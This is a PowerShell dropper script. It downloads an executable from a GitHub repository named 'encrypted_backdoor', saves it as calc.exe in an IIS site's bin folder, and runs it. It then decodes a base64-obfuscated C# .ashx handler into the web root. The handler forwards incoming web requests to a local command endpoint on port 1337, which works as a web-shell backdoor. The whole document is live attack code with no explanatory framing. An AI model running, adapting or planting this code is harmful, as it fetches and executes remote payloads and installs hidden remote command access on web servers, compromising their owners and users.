
$url = "https://raw.githubusercontent.com/Cyb3rDud3/encrypted_backdoor/main/letter.exe"
$dump_path = "C:\inetpub\iis-test-only1mmmakwoprqwe.eastus.cloudapp.azure.com\bin\calc.exe"
$a = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPgoKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV2ViOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnM7CnVzaW5nIFN5c3RlbS5OZXQuSHR0cDsKdXNpbmcgU3lzdGVtLldlYi5TY3JpcHQuU2VyaWFsaXphdGlvbjsKCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIKewoKICAvKiAuTmV0IHJlcXVpcmVzIHRoaXMgdG8gYmUgaW1wbGVtZW50ZWQgKi8KICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlCiAgewogICAgZ2V0IHsgcmV0dXJuIHRydWU7IH0KICB9CgoKCgoKICAvKiBtYWluIGV4ZWN1dGluZyBjb2RlICovCiAgcHVibGljICB2b2lkIFByb2Nlc3NSZXF1ZXN0KEh0dHBDb250ZXh0IGNvbnRleHQpCiAgewoKICAgIHZhciBzdHJVUkwgPSAiaHR0cDovLzEyNy4wLjAuMToxMzM3L3J1bi9jbWQiOwogICAgVXJpIHUgPSBuZXcgVXJpKHN0clVSTCk7CiAgICAgICAgICAgICAgICBXZWJSZXF1ZXN0IHJlcXVlc3QgPSBXZWJSZXF1ZXN0LkNyZWF0ZSh1KTsKICAgICAgICAgICAgICAgIHJlcXVlc3QuTWV0aG9kID0gY29udGV4dC5SZXF1ZXN0Lkh0dHBNZXRob2Q7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyBrZXkgaW4gY29udGV4dC5SZXF1ZXN0LkhlYWRlcnMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGtleSAhPSAiWC1SRURJUkVDVFVSTCIpewogICAgICAgICAgICAgICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LkhlYWRlcnMuQWRkKGtleSwgY29udGV4dC5SZXF1ZXN0LkhlYWRlcnMuR2V0KGtleSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSl7fQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJlcXVlc3QuQ29udGVudFR5cGU9ImFwcGxpY2F0aW9uL2pzb24iOwogICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBjb250ZXh0LlJlcXVlc3QuQ29udGVudExlbmd0aDsKICAgICAgICAgICAgICAgIGJ5dGVbXSBidWZmID0gbmV3IGJ5dGVbYnVmZkxlbl07CiAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICBpZigoYyA9IGNvbnRleHQuUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoYnVmZik7CiAgICAgICAgICAgICAgICAgICAgdHJ5ewogICAgICAgICAgICAgICAgICAgICAgICBTdHJlYW0gYm9keSA9IHJlcXVlc3QuR2V0UmVxdWVzdFN0cmVhbSgpOwogICAgICAgICAgICAgICAgICAgICAgICBib2R5LldyaXRlKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICAgICAgYm9keS5DbG9zZSgpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKXt9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgSHR0cFdlYlJlc3BvbnNlIHJlc3BvbnNlID0gKEh0dHBXZWJSZXNwb25zZSlyZXF1ZXN0LkdldFJlc3BvbnNlKCk7CiAgICAgICAgICAgICAgICBXZWJIZWFkZXJDb2xsZWN0aW9uIHdlYkhlYWRlciA9IHJlc3BvbnNlLkhlYWRlcnM7CiAgICAgICAgICAgICAgICBmb3IgKGludCBpPTA7aSA8IHdlYkhlYWRlci5Db3VudDsgaSsrKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHN0cmluZyBya2V5ID0gd2ViSGVhZGVyLkdldEtleShpKTsKICAgICAgICAgICAgICAgICAgICBpZiAocmtleSAhPSAiQ29udGVudC1MZW5ndGgiICYmIHJrZXkgIT0gIlRyYW5zZmVyLUVuY29kaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgY29udGV4dC5SZXNwb25zZS5BZGRIZWFkZXIocmtleSwgd2ViSGVhZGVyW2ldKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBTdHJlYW1SZWFkZXIgcmVwQm9keSA9IG5ldyBTdHJlYW1SZWFkZXIocmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikpOwogICAgICAgICAgICAgICAgc3RyaW5nIHJib2R5ID0gcmVwQm9keS5SZWFkVG9FbmQoKTsKICAgICAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuQWRkSGVhZGVyKCJDb250ZW50LUxlbmd0aCIsIHJib2R5Lkxlbmd0aC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUocmJvZHkpOwogICAgICAgICAgICAgICAgcmV0dXJuOwoKCgp9CgoKfQo="))

Invoke-Webrequest -URI $url -OutFile $dump_path;
Start-Process -FilePath "C:\inetpub\iis-test-only1mmmakwoprqwe.eastus.cloudapp.azure.com\bin\calc.exe";

echo $a | Out-File c:/inetpub/iis-test-only1mmmakwoprqwe.eastus.cloudapp.azure.com/ppqoozpb18671.ashx
